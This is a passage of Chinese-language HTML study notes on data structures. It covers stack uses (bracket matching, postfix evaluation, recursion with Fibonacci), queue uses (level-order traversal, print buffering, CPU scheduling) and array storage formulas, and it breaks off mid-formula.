<p><strong>算法的思想如下：</strong></p>
<ul>
<li>初始设置一个空栈，顺序读入括号</li>
<li>若是右括号，则或使置于栈顶的最急迫期待得以消解，或是不合法的情况（括号序列不匹配，退出程序）</li>
<li>若是左括号，则作为一个新的更急迫的期待压入栈中，自然使原有的在栈中的所有未消解的期待的急迫性降了一级。算法结束时，栈为空，否则括号序列不匹配</li>
</ul>
<h4> 栈在表达式求值中的应用</h4>
<p>表达式求值是程序设计语言编译中一个最基本的问题，它的实现是栈应用的一个典型范例。中缀表达式不仅依赖运算符的优先级，而且还要处理括号。后缀表达式的运算符在操作数后面，在后缀表达式中已考虑了运算符的优先级，没有括号，只有操作数和运算符。中缀表达式 <code>A + B * (C - D) - E / F</code> 所对应的后缀表达式为 <code>ABCD - * + EF / -</code>。</p>
<p>通过后缀表示计算表达式值的过程为：顺序扫描表达式的每一项，然后根据它的类型做如下相应操作：若该项是操作数，则将其压入栈中；若该项是操作符 <code>&lt;op&gt;</code>，则连续从栈中退出两个操作数 <code>Y</code> 和 <code>X</code>，形成运算指令 <code>X &lt;op&gt; Y</code>，并将计算结果重新压入栈中。当表达式的所有项都扫描并处理完后，栈顶存放的就是最后的计算结果。</p>
<p>例如，后缀表达式 <code>ABCD - * + EF / -</code> 求值的过程需要 <code>12</code> 步，见下表所示：</p>
<table>
<thead>
<tr>
<th style="text-align:center">步</th>
<th style="text-align:center">扫描项</th>
<th style="text-align:center">项类型</th>
<th style="text-align:left">动作</th>
<th style="text-align:center">栈中内容</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">置空栈</td>
<td style="text-align:center">空</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">A</td>
<td style="text-align:center">操作数</td>
<td style="text-align:left">进栈</td>
<td style="text-align:center">A</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">B</td>
<td style="text-align:center">操作数</td>
<td style="text-align:left">进栈</td>
<td style="text-align:center">A B</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">C</td>
<td style="text-align:center">操作数</td>
<td style="text-align:left">进栈</td>
<td style="text-align:center">A B C</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">D</td>
<td style="text-align:center">操作数</td>
<td style="text-align:left">进栈</td>
<td style="text-align:center">A B C D</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">-</td>
<td style="text-align:center">操作符</td>
<td style="text-align:left">D、C 退栈，计算 C - D，结果 R<sub>1</sub> 进栈</td>
<td style="text-align:center">A B R<sub>1</sub></td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">*</td>
<td style="text-align:center">操作符</td>
<td style="text-align:left">R<sub>1</sub>、B 退栈，计算 B × R<sub>1</sub>，结果 R<sub>2</sub> 进栈</td>
<td style="text-align:center">A R<sub>2</sub></td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">+</td>
<td style="text-align:center">操作符</td>
<td style="text-align:left">R<sub>2</sub>、A 退栈，计算 A + R<sub>2</sub>，结果 R<sub>3</sub> 进栈</td>
<td style="text-align:center">R<sub>3</sub></td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">E</td>
<td style="text-align:center">操作数</td>
<td style="text-align:left">进栈</td>
<td style="text-align:center">R<sub>3</sub> E</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">F</td>
<td style="text-align:center">操作数</td>
<td style="text-align:left">进栈</td>
<td style="text-align:center">R<sub>3</sub> E F</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">/</td>
<td style="text-align:center">操作符</td>
<td style="text-align:left">F、E 退栈，计算 E / F，结果 R<sub>4</sub> 进栈</td>
<td style="text-align:center">R<sub>3</sub> R<sub>4</sub></td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">-</td>
<td style="text-align:center">操作符</td>
<td style="text-align:left">R<sub>4</sub>、R<sub>3</sub> 退栈，计算 R<sub>3</sub> - R<sub>4</sub>，结果 R<sub>5</sub> 进栈</td>
<td style="text-align:center">R<sub>5</sub></td>
</tr>
</tbody>
</table>
<h4> 栈在递归中的应用</h4>
<p>递归是一种重要的程序设计方法。简单地说，若 <strong>在一个函数、过程或数据结构的定义中又应用了它自身，则这个函数、过程或数据结构称为是递归定义的</strong>，简称 <strong>递归。</strong></p>
<p>它通常把一个大型的复杂问题层层转化为一个与原问题相似的规模较小的问题来求解，递归策略只需少量的代码就可以描述出解题过程所需要的多次重复计算，大大减少了程序的代码量。但在通常情况下，它的效率并不是太高。</p>
<p>以 <strong>斐波那契数列</strong> 为例，其定义为：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>F</mi><mi>i</mi><mi>b</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>F</mi><mi>i</mi><mi>b</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>F</mi><mi>i</mi><mi>b</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mspace width="0.5691em"></mspace><mi>n</mi><mo>&gt;</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1</mn><mo separator="true">,</mo><mspace width="10.6698em"></mspace><mi>n</mi><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo><mspace width="10.6698em"></mspace><mi>n</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">
Fib(n) = \begin{cases}
Fib(n - 1) + Fib(n -2), \hspace{0.2cm} n &gt; 1 \\
1, \hspace{3.75cm} n = 1 \\
0, \hspace{3.75cm} n = 0
\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">ib</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:4.32em;vertical-align:-1.91em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35em;"><span style="top:-2.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.192em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"></path></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"></path></svg></span></span><span style="top:-4.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.85em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">ib</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">ib</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">2</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.5691em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:10.6698em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span><span style="top:-1.53em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:10.6698em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.91em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>这就是递归的一个典型例子，用程序实现时如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>必须注意递归模型不能是循环定义的，其必须满足下面的两个条件：</p>
<ul>
<li>递归表达式（递归体）</li>
<li>边界条件（递归出口）</li>
</ul>
<p>递归的精髓在于能否将原始问题转换为属性相同但规模较小的问题。</p>
<p>在递归调用的过程中，系统为每一层的返回点、局部变量、传入实参等开辟了递归工作栈来进行数据存储，递归次数过多容易造成栈溢出等。而其效率不高的原因是递归调用过程中包含很多重复的计算。所以，递归的效率低下，但优点是代码简单，容易理解。</p>
<h4> 队列在层次遍历中的应用</h4>
<p>在信息处理中有一大类问题需要逐层或逐行处理。这类问题的解决方法往往是在处理当前层或当前行时就对下一层或下一行做预处理，把处理顺序安排好，等到当前层或当前行处理完毕，就可以处理下一层或下一行。使用队列是为了保存下一步的处理顺序。下面用二叉树层次遍历的例子，如下图所示，说明队列的应用。下表显示了层次遍历二叉树的过程。</p>
<figure><figcaption>二叉树</figcaption></figure>
<p>该过程的简单描述如下：</p>
<ol>
<li>根结点入队</li>
<li>若队空（所有结点都己处理完毕），则结束遍历；否则重复 <code>3</code> 操作</li>
<li>队列中第一个结点出队，并访问之。若其有左孩子，则将左孩子入队；若其有右孩子，则将右孩子入队，返回 <code>2</code>。</li>
</ol>
<table>
<thead>
<tr>
<th style="text-align:center">序</th>
<th style="text-align:center">说明</th>
<th style="text-align:center">队内</th>
<th style="text-align:center">队外</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">A 入</td>
<td style="text-align:center">A</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">A 出，B C 入</td>
<td style="text-align:center">B C</td>
<td style="text-align:center">A</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">B 出，D 入</td>
<td style="text-align:center">C D</td>
<td style="text-align:center">A B</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">C 出，E F 入</td>
<td style="text-align:center">D E F</td>
<td style="text-align:center">A B C</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">D 出，G 入</td>
<td style="text-align:center">E F G</td>
<td style="text-align:center">A B C D</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">E 出，H I 入</td>
<td style="text-align:center">F G H I</td>
<td style="text-align:center">A B C D E</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">F 出</td>
<td style="text-align:center">G H I</td>
<td style="text-align:center">A B C D E F</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">G H I 出</td>
<td style="text-align:center"></td>
<td style="text-align:center">A B C D E F G H I</td>
</tr>
</tbody>
</table>
<h4> 队列在计算机系统中的应用</h4>
<p>队列在计算机系统中的应用非常广泛，以下仅从两个方面来简述队列在计算机系统中的作用：第一个方面是解决主机与外部设备之间速度不匹配的问题；第二个方面是解决由多用户引起的资源竞争问题。</p>
<p><strong>对于第一个方面</strong>，仅以主机和打印机之间速度不匹配的问题为例做简要说明。主机输出数据给打印机打印，输出数据的速度比打印数据的速度要快得多，由于速度不匹配，若直接把输出的数据送给打印机打印显然是不行的。解决的方法是设置一个打印数据缓冲区，主机把要打印输出的数据依次写入这个缓冲区，写满后就暂停输出，转去做其他的事情。打印机就从缓冲区中按照先进先出的原则依次取出数据并打印，打印完后再向主机发出请求。主机接到请求后再向缓冲区写入打印数据。这样做既保证了打印数据的正确，又使主机提高了效率。由此可见，打印数据缓冲区中所存储的数据就是一个队列。</p>
<p><strong>对于第二个方面</strong>，CPU（即中央处理器，它包括运算器和控制器）资源的竞争就是一个典型的例子。在一个带有多终端的计算机系统上，有多个用户需要 CPU 各自运行自己的程序，它们分别通过各自的终端向操作系统提出占用 CPU 的请求。操作系统通常按照每个请求在时间上的先后顺序，把它们排成一个队列，每次把 CPU 分配给队首请求的用户使用。当相应的程序运行结束或用完规定的时间间隔后，令其出队，再把 CPU 分配给新的队首请求的用户使用。这样既能满足每个用户的请求，又使 CPU 能够正常运行。</p>
<h3> 数组和特殊矩阵</h3>
<p>矩阵在计算机图形学、工程计算中占有举足轻重的地位。在数据结构中考虑的是如何用最小的内存空间来存储同样的一组数据。所以，不研究矩阵及其运算等，而把精力放在如何将矩阵更有效地存储在内存中，并能方便地提取矩阵中的元素。</p>
<h4> 数组的定义</h4>
<p>数组是由 <code>n（n ≥ 1）</code> 个相同类型的数据元素构成的有限序列，每个数据元素称为一个 <strong>数组元素</strong>，每个元素在 <code>n</code> 个线性关系中的序号称为该元素的 <strong>下标</strong>，下标的取值范围称为数组的 <strong>维界</strong>。</p>
<p><strong>数组与线性表的关系</strong>：数组是线性表的推广。一维数组可视为一个线性表；二维数组可视为其元素也是定长线性表的线性表，以此类推。数组一旦被定义，其维数和维界就不再改变。因此，除结构的初始化和销毁外，数组只会有存取元素和修改元素的操作。</p>
<h4> 数组的存储结构</h4>
<p>大多数计算机语言都提供了数组数据类型，逻辑意义上的数组可采用计算机语言中的数组数据类型进行存储，一个数组的所有元素在内存中占用一段连续的存储空间。</p>
<p>以一维数组 <code>A[0 ... n-l]</code> 为例，其存储结构关系式为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>O</mi><mi>C</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mi>O</mi><mi>C</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mn>0</mn></msub><mo>+</mo><mi>i</mi><mo>×</mo><mi>L</mi><mo stretchy="false">(</mo><mn>0</mn><mo>⩽</mo><mi>i</mi><mo>&lt;</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">LOC(a_{i}) = LOC(a_{0} + i \times L (0 \leqslant i &lt; n))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07153em;">OC</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07153em;">OC</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6986em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">))</span></span></span></span> 其中，L 是每个数组元素所占的存储单元。</p>
<p>对于多维数组，有 <strong>两种映射方法</strong>：按行优先和按列优先。以二维数组为例，按行优先存储的基本思想是：先行后列，先存储行号较小的元素，行号相等先存储列号较小的元素。设二维数组的行下标与列下标的范围分别为 [0, h<sub>1</sub>] 与 [0, h<sub>2</sub>]，则存储结构关系式为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>O</mi><mi>C</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mi>O</mi><mi>C</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mn>0</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">[</mo><mi>i</mi><mo>×</mo><mo stretchy="false">(</mo><msub><mi>h</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>j</mi><mo stretchy="false">]</mo><mo>×</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">LOC(a_{i,j}) = LOC(a_{0,0}) + [i \times (h_{2} + 1) + j] \times L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07153em;">OC</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07153em;">OC</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span></p>
<p>例如，对于数组 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mrow><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo></mrow></msub></mrow><annotation encoding="application/x-tex">A_{[2][3]}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0385em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">3</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span></span>，它 <strong>按行优先</strong> 方式在内存中的存储形式如下所示：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>A</mi><mrow><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo></mrow></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mspace linebreak="newline"></mspace><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></msub><mtext>&nbsp;</mtext><mi mathvariant="normal">∣</mi><mtext>&nbsp;</mtext><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msub><mtext>&nbsp;</mtext><mi mathvariant="normal">∣</mi><mtext>&nbsp;</mtext><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msub><mtext>&nbsp;</mtext><mi mathvariant="normal">∣</mi><mtext>&nbsp;</mtext><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></msub><mtext>&nbsp;</mtext><mi mathvariant="normal">∣</mi><mtext>&nbsp;</mtext><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msub><mtext>&nbsp;</mtext><mi mathvariant="normal">∣</mi><mtext>&nbsp;</mtext><msub><mi>a</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msub></mrow><annotation encoding="application/x-tex">
A_{[2][3]} = \begin{bmatrix}
   a_{[0][0]} &amp; a_{[0][1]} &amp; a_{[0][2]} \\
   a_{[1][0]} &amp; a_{[1][1]} &amp; a_{[1][2]}
\end{bmatrix} \\
a_{[0][0]} \space | \space a_{[0][1]} \space | \space a_{[0][2]} \space | \space a_{[1][0]} \space | \space a_{[1][1]} \space | \space a_{[1][2]}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0385em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span><span class="mopen mtight">[</span><span class="mord mtight">3</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 